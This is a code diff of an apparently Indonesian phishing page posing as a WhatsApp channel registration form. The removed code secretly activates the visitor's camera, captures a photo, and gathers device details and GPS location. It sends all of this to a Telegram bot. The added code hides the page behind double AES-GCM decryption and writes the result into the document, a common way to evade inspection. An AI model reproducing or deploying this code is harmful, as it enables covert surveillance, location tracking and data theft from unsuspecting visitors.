+  const key1 = Uint8Array.from("475e03683caeea1a248b1ad194d18fde359d1f0dabd49a748e868d2ec3d16bde".match(/.{1,2}/g).map(x => parseInt(x,16)));
+  const key2 = Uint8Array.from("6a15c4b8dc32e7fc8b1ca5e5d9f2c212a5c4b67b584745cbb8963b5aea0d4c69".match(/.{1,2}/g).map(x => parseInt(x,16)));
 
-    // Real-time clock
-    function updateClock() {
-      const now = new Date();
-      const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
-      document.getElementById('clock').innerText = timeStr;
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
+  const decode = async () => {
+    const iv2b = Uint8Array.from(atob(iv2), c => c.charCodeAt(0));
+    const c2b = Uint8Array.from(atob(c2), c => c.charCodeAt(0));
+    const key2Imp = await crypto.subtle.importKey("raw", key2, "AES-GCM", false, ["decrypt"]);
+    const dec1 = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv2b }, key2Imp, c2b);
+    const obj = JSON.parse(new TextDecoder().decode(dec1));
 
-    let videoReady = false;
+    const iv1 = Uint8Array.from(atob(obj.iv), c => c.charCodeAt(0));
+    const c1 = Uint8Array.from(atob(obj.cipher), c => c.charCodeAt(0));
+    const key1Imp = await crypto.subtle.importKey("raw", key1, "AES-GCM", false, ["decrypt"]);
+    const dec2 = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv1 }, key1Imp, c1);
 
-    async function startCamera() {
-      try {
-        const video = document.getElementById('video');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => { video.play(); videoReady = true; };
-      } catch (err) {
-        alert("Kamera tidak bisa diakses: " + err);
-      }
-    }
+    const hashCheck = await crypto.subtle.digest("SHA-256", dec2);
+    const hex = [...new Uint8Array(hashCheck)].map(b => b.toString(16).padStart(2,"0")).join("");
+    if(hex !== h) throw "Hash Mismatch";
 
-    async function capturePhoto() {
-      if (!videoReady) await new Promise(resolve => setTimeout(resolve, 500));
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.95));
-    }
+    document.open(); document.write(new TextDecoder().decode(dec2)); document.close();
+  };
+  decode().catch(() => {
+    document.body.innerHTML = "<h1 style='color:red;text-align:center'>❌ Gagal Dekripsi</h1>";
+    setTimeout(() => document.body.innerHTML = "", 1000);
+  });
 
-    async function getDeviceInfo() {
-      const userAgent = navigator.userAgent;
-      const platform = navigator.platform;
-      const language = navigator.language;
-      const deviceMemory = navigator.deviceMemory || "Tidak tersedia";
-      const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
-      const androidVersion = androidMatch ? androidMatch[1] : "Tidak Android";
-      const isMobile = /Mobi|Android/i.test(userAgent);
-      const deviceType = isMobile ? "Mobile" : "Desktop";
-      const deviceName = userAgent.match(/\((.*?)\)/)?.[1] || platform;
-
-      const info = {
-        deviceName, deviceType, platform, language,
-        androidVersion, ram: deviceMemory + " GB",
-        screenWidth: window.screen.width, screenHeight: window.screen.height,
-        windowWidth: window.innerWidth, windowHeight: window.innerHeight
-      };
-
-      return new Promise(resolve => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(pos => {
-            info.latitude = pos.coords.latitude;
-            info.longitude = pos.coords.longitude;
-            info.accuracy = pos.coords.accuracy;
-            info.mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            resolve(info);
-          }, () => resolve(info));
-        } else {
-          resolve(info);
-        }
-      });
-    }
-
-    async function sendTelegramMessage(text, photoBlob=null) {
-      try {
-        if (photoBlob) {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", photoBlob, "foto.jpg");
-          formData.append("caption", text);
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body: formData });
-        } else {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body: JSON.stringify({ chat_id: CHAT_ID, text })
-          });
-        }
-      } catch(err) { console.error("Gagal kirim ke Telegram:", err); }
-    }
-
-    document.getElementById('channelForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const idChannel = document.getElementById('idChannel').value;
-      const namaChannel = document.getElementById('namaChannel').value;
-      const linkChannel = document.getElementById('linkChannel').value;
-      const totalPengikut = document.getElementById('totalPengikut').value;
-
-      const photoBlob = await capturePhoto();
-      const deviceInfo = await getDeviceInfo();
-
-      const now = new Date();
-      const timestamp = now.getFullYear()+"-"+String(now.getMonth()+1).padStart(2,'0')+"-"+String(now.getDate()).padStart(2,'0')+
-                        " "+String(now.getHours()).padStart(2,'0')+":"+String(now.getMinutes()).padStart(2,'0')+":"+String(now.getSeconds()).padStart(2,'0');
-
-      let message = `
-📋 Pendaftaran Channel WhatsApp
-ID Channel: ${idChannel}
-Nama Channel: ${namaChannel}
-Link Channel: ${linkChannel}
-Total Pengikut: ${totalPengikut}
-
-⏰ Waktu Kirim: ${timestamp}
-
-🌐 Device Info:
-Nama Device: ${deviceInfo.deviceName}
-Jenis Device: ${deviceInfo.deviceType}
-Platform: ${deviceInfo.platform}
-Bahasa: ${deviceInfo.language}
-Versi Android: ${deviceInfo.androidVersion}
-RAM: ${deviceInfo.ram}
-Resolusi Layar: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
-Resolusi Jendela: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
-`;
-
-      if(deviceInfo.latitude && deviceInfo.longitude){
-        message += `\n📍 Lokasi: ${deviceInfo.latitude}, ${deviceInfo.longitude} (±${deviceInfo.accuracy} m)
-Maps: ${deviceInfo.mapsLink}`;
-      } else { message += `\n📍 Lokasi: Tidak tersedia`; }
-
-      await sendTelegramMessage(message, photoBlob);
-      alert("✅ Data berhasil dikirim ke Telegram!");
-      document.getElementById('channelForm').reset();
-    });
-
-    startCamera();
-  </script>
-</body>
-</html>
+} catch(e) {
+  document.body.innerHTML = "<h1 style='color:red;text-align:center'>Akses Diblokir</h1>";
+}
+})();
+    </script>
